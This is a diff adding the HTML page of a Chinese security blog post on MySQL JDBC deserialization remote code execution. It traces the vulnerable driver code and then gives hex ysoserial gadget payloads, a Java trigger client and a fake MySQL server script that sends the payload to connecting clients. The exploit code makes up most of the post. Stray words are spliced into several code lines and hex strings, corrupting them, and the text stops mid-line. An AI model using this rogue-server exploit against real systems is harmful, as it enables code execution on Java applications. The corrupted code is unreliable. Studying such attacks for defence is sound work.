@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>mysql jdbc反序列化的不深入研究 | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+我终于更新博客了……">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="https://dragonbox.top/posts/sec-jdbc-unserialize/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="https://dragonbox.top/flash.ico">
+<link rel="mask-icon" href="https://dragonbox.top/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://dragonbox.top/posts/sec-jdbc-unserialize/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://dragonbox.top/posts/sec-jdbc-unserialize/">
+  <meta property="og:site_name" content="ch4ser の 超元域">
+  <meta property="og:title" content="mysql jdbc反序列化的不深入研究">
+  <meta property="og:description" content=" 我终于更新博客了……">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-10-15T21:46:28+00:00">
+    <meta property="article:modified_time" content="2021-10-15T21:46:28+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mysql jdbc反序列化的不深入研究">
+<meta name="twitter:description" content="
+我终于更新博客了……">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://dragonbox.top/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "mysql jdbc反序列化的不深入研究",
+      "item": "https://dragonbox.top/posts/sec-jdbc-unserialize/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "mysql jdbc反序列化的不深入研究",
+  "name": "mysql jdbc反序列化的不深入研究",
+  "description": " 我终于更新博客了……\n",
+  "keywords": [
+    
+  ],
+  "articleBody": " 我终于更新博客了……\n漏洞原理 当jdbc客户端连接到远程mysql服务器的时候，双方在连接过程中会进行一些数据交换并执行一些查询语句，比如SHOW SESSION STATUS，在使用特定构造的jdbc链接去连接mysql服务器时，SHOW SESSION STATUS的返回数据会在客户端进行反序列化进而触发RCE代码。\n根据 http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ 中的描述，可以通过以下方式手动触发反序列化，注意这不是在触发jdbc反序列化漏洞，但是在后面利用的时候有用。\nCREATE DATABASE IF NOT EXISTS test; CREATE TABLE IF NOT EXISTS test.eviltable ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, evil blob, PRIMARY KEY (`id`) ); set @obj=0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278; INSERT INTO test.eviltable(`evil_2`) VALUES (@obj); 该数据是由执行以下命令生成的\njava8 -jar ysoserial.jar CommonsCollections7 \"touch /tmp/cc7\" | xxd -ps -c 200 | tr -d '\\n' import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; public class main { public static void main(String[] args) throws Exception{ Class.forName(\"com.mysql.cj.jdbc.Driver\"); String jdbc_url = \"jdbc:mysql://192.168.31.119:3306/test?\" + \"autoDeserialize=true\" + \"\u0026queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"; Connection con = DriverManager.getConnection(jdbc_url,\"xxxx\",\"toor\"); PreparedStatement ptmt = con.prepareStatement(\"select evil from eviltable ;\"); ResultSet rs = ptmt.executeQuery(); rs.next(); rs.getObject(1); } } 启动wireshark进行抓包，设置过滤规则mysql\n图中选中的数据包就是执行select evil from eviltable ;后返回的数据，也就是刚才生成的数据。将其复制出来，并删除mysql之外的数据，得到如下数据\n01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000 该数据在jdbc端被反序列化后触发了漏洞。\n这只是普通的反序列化，要在jdbc连接的过程中触发反序列化，首先来看com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()\npublic class ServerStatusDiffInterceptor implements QueryInterceptor { ... public \u003cT extends Resultset\u003e T postProcess(Supplier\u003cString\u003e sql, Query interceptedQuery, T originalResultSet, ServerSession serverSession) { this.populateMapWithSessionStatusValues(this.postExecuteValues); this.log.logInfo(\"Server status change for query:\\n\" + Util.calculateDifferences(this.preExecuteValues, this.postExecuteValues)); return null; } private void populateMapWithSessionStatusValues(Map\u003cString, String\u003e toPopulate) { Statement stmt = null; ResultSet rs = null; try { try { toPopulate.clear(); stmt = this.connection.createStatement(); rs = stmt.executeQuery(\"SHOW SESSION STATUS\"); ResultSetUtil.resultSetToMap(toPopulate, rs); } finally { if (rs != null) { rs.close(); } if (stmt != null) { stmt.close(); } } } catch (SQLException var8) { throw ExceptionFactory.createException(var8.getMessage(), var8); } } ... } ServerStatusDiffInterceptor是一个实现了QueryInterceptor接口的拦截器，当queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor的时候就会经过这个拦截器，并调用这个拦截器的preProcess方法和 postProcess方法。\n可以看到SHOW SESSION STATUS语句请求的结果进入了 com.mysql.cj.jdbc.util.ResultSetUtil 的 resultSetToMap方法中。跟进看看\npublic class ResultSetUtil { public ResultSetUtil() { } public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException { while(rs.next()) { mappedValues.put(rs.getObject(1), rs.getObject(2)); } } ... } 调用了 com.mysql.cj.jdbc.result.ResultSetImpl的getObject方法\npublic Object getObject(int columnIndex) throws SQLException { try { this.checkRowPos(); this.checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; if (this.thisRow.getNull(columnIndexMinusOne)) { return null; } else { Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch(field.getMysqlType()) { case BIT: if (!field.isBinary() \u0026\u0026 !field.isBlob()) { return field.isSingleBit() ? this.getBoolean(columnIndex) : this.getBytes(columnIndex); } else { byte[] data = this.getBytes(columnIndex); if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(\"autoDeserialize\").getValue()) { return data; } else { Object obj = data; if (data != null \u0026\u0026 data.length \u003e= 2) { if (data[0] != -84 || data[1] != -19) { return this.getString(columnIndex); } try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException var13) { throw SQLError.createSQLException(Messages.getString(\"ResultSet.Class_not_found___91\") + var13.toString() + Messages.getString(\"ResultSet._while_reading_serialized_object_92\"), this.getExceptionInterceptor()); } catch (IOException var14) { obj = data; } } return obj; } } ... } } } } 这里进行了一个判断，在autoDeserialize=true的情况下会对数据进行反序列化。\n那么链条就会比较清晰了，接下来是怎么伪造一个mysql服务端来和jdbc客户端进行数据交互，并在客户端发送SHOW SESSION STATUS的时候将payload发送给客户端触发反序列化漏洞。这里通过观察wireshark数据包简单分析一下\n首先是greeting，然后jdbc发送登陆请求，服务端返回Response OK数据，这个Response OK在后面的数据交互中多次用到，需要我们伪造的mysql服务端用来进行数据返回。在经过一些数据协商后，来到SHOW SESSION STATUS部分，我们伪造的mysql服务端就可以发送真正的payload给jdbc客户端来进行反序列化了。\n漏洞利用 这里直接拿别的师傅的脚本，从https://xz.aliyun.com/t/8159#toc-1 这里拿的\n# -*- coding:utf-8 -*- #@Time : 2020/7/27 2:10 #@Author: Tri0mphe7 #@File : server.py import socket import binascii import os greeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\" response_ok_data=\"0700000200000002000000\" def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : {}\".format(data)) return str(data).lower() def send_data(conn,data): print(\"[*] Sending the package : {}\".format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): # file文件的内容使用ysoserial生成的 使用规则 java -jar ysoserial [common7那个] \"calc\" \u003e a file= r'a' if os.path.isfile(file): with open(file, 'rb') as f: payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8') print(\"open successs\") else: print(\"open false\") #calc payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878' return payload_content # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\"Connection come from {}:{}\".format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \"session.auto_increment_increment\" in data: _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c21的0009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000' send_data(conn,_payload) data=receive_data(conn) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"set names\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"set character_set_results\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"show session status\" in data: mysql_data = '0100000102' mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000' mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000' # 为什么我加了EOF Packet 就无法正常运行呢？？ # 获取payload payload_content=get_payload_content() # 计算payload长度 payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # 计算数据包长度 data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex mysql_data += str(payload_content) mysql_data += '07000005fe000022000100' send_data(conn, mysql_data) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535show session status441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) break if __name__ == '__main__': HOST ='0.0.0.0' PORT = 3309 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT)) run() 经过之前的分析，这个脚本是不难看懂的，但是该工具在我这里使用的时候无法复现，原因在于show session status之后发送的payload有误，那怎么办呢？毕竟要修改这部分代码是需要对mysql发送的数据包格式进行一个系统的了解和认识的，关于数据包格式，在https://xz.aliyun.com/t/8159#toc-1 这篇文章中有分析到，但我无意对数据包格式作深究，于是用了一个比较偷懒的办法。\n还记得之前用jdbc将payload请求回本地并进行手动反序列化时候的操作吗，我们可以从wireshark中将那个数据包中的数据copy下来，删除mysql数据以外的数据，然后加入到脚本中，那么脚本进过修改之后如下所示。\n# -*- coding:utf-8 -*- #@Time : 2020/7/27 2:10 #@Author: Tri0mphe7 #@File : server.py import socket import binascii import os greeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\" response_ok_data=\"0700000200000002000000\" def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : {}\".format(data)) return str(data).lower() def send_data(conn,data): print(\"[*] Sending the package : {}\".format(data)) conn.send(binascii.a2b_hex(data))朋友他好哦你 # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\"Connection come from {}:{}\".format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \"session.auto_increment_increment\" in data: _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000' send_data(conn,_payload) data=receive_data(conn) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"set names\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"set character_set_results\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"show session status\" in data: mydata = '01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000' send_data(conn, mydata) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) break if __name__ == '__main__': HOST ='0.0.0.0' PORT = 3309 sk = socket.socket(socket.AF_INET, 